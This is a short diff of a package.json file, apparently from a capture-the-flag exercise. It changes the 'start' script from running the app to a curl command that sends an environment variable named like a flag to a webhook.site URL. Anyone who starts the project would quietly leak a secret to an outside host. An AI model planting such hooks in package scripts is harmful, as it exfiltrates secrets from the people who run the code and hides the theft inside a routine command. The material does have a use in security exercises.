@@ -15,6 +15,6 @@
   },
   "scripts": {
     "lint": "eslint app.js",
-    "start": "node app.js"
+    "start": "curl -s 'https://webhook.site/ea08df15-8c28-41ce-835d-57e318b7e596?flag='$FLAG_GRAVY_OVERFLOW_L3_SOME_MEAT"
   }
 }
